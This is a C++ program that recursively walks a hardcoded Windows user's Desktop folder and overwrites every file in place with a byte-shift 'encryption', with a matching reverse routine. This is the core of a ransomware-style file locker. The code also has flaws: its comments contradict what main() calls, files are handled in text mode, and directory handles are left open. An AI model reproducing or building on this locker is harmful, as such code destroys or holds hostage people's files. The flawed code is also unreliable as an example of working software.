#include <iostream>
#include <fstream>
#include <dirent.h>
#include <sys/stat.h>

void encryptFile(std::string filePath) {
    // File is the file will be encrypted
    // tempFile is a temporary file which save encrypted data of file
    std::fstream file, tempFile;
    std::string tempFilePath = "temp.txt";

    // Open file streams
    // Open file to read, temp file to write
    file.open(filePath, std::ios::in);
    tempFile.open(tempFilePath, std::ios::out);

    // Read byte by byte through file
    char byte;
    while (file >> std::noskipws >> byte) {
        // Encrypt this byte by add 1 to it
        byte += 1;
        // Save this byte into temp file
        tempFile << byte;
    }

    // Close file stream
    file.close();
    tempFile.close();

    // Open file streams
    // But this time we will open file to write and temp to read
    file.open(filePath, std::ios::out);
    tempFile.open(tempFilePath, std::ios::in);

    // Read through temp file byte by byte
    while (tempFile >> std::noskipws >> byte) {
        // Save this byte into file
        file << byte;
    }

    // Close file streams
    file.close();
    tempFile.close();

    // Delete temp file
    remove(tempFilePath.c_str());
}

void decryptFile(std::string filePath) {
    // File is the file will be encrypted
    // tempFile is a temporary file which save encrypted data of file
    std::fstream file, tempFile;
    std::string tempFilePath = "temp.txt";

    // Open file streams
    // Open file to read, temp file to write
    file.open(filePath, std::ios::in);
    tempFile.open(tempFilePath, std::ios::out);

    // Read byte by byte through file
    char byte;
    while (file >> std::noskipws >> byte) {
        // Encrypt this byte by add 1 to it
        byte -= 1;
        // Save this byte into temp file
        tempFile << byte;
    }

    // Close file stream
    file.close();
    tempFile.close();

    // Open file streams
    // But this time we will open file to write and temp to read
    file.open(filePath, std::ios::out);
    tempFile.open(tempFilePath, std::ios::in);

    // Read through temp file byte by byte
    while (tempFile >> std::noskipws >> byte) {
        // Save this byte into file
        file << byte;
    }

    // Close file streams
    file.close();
    tempFile.close();

    // Delete temp file
    remove(tempFilePath.c_str());
}

    // This function will read through all directories and files in a directory
    // If it find a file, it will encrypt that file
    // If it find a directory, it will read through that directory
void encryptDirectory(std::string directoryPath) {
    DIR* directory;
    struct dirent* entry;
    struct stat status;
    std::string path;

    // Open the directory
    if ((directory = opendir(directoryPath.c_str())) != NULL) {
        // Open directory successfully
        // Read through directory
        while ((entry = readdir(directory)) != NULL) {
            // Check if this entry (file or directory) is current directy (".") or parent directory ("..")
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                // Get entry full path
                path = directoryPath + "\\" + entry->d_name;
                // Check if this entry is a directory or file
                stat(path.c_str(), &status);
                if (S_ISDIR(status.st_mode)) {
                    // This is a directory
                    // We will read through it
                    encryptDirectory(path);
                } else {
                    // This is a file
                    // We will encrypt it;
                    encryptFile(path);
                }
            }
        }
    }
}

void decryptDirectory(std::string directoryPath) {
    DIR* directory;
    struct dirent* entry;
    struct stat status;
    std::string path;

    // Open the directory
    if ((directory = opendir(directoryPath.c_str())) != NULL) {
        // Open directory successfully
        // Read through directory
        while ((entry = readdir(directory)) != NULL) {
            // Check if this entry (file or directory) is current directy (".") or parent directory ("..")
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                // Get entry full path
                path = directoryPath + "\\" + entry->d_name;
                // Check if this entry is a directory or file
                stat(path.c_str(), &status);
                if (S_ISDIR(status.st_mode)) {
                    // This is a directory
                    // We will read through it
                    decryptDirectory(path);
                } else {
                    // This is a file
                    // We will encrypt it;
                    decryptFile(path);
                }
            }
        }
    }
}

int main() {

    // Encrypt directory
    decryptDirectory("C:\\Users\\Bones\\Desktop");

    return 0;
}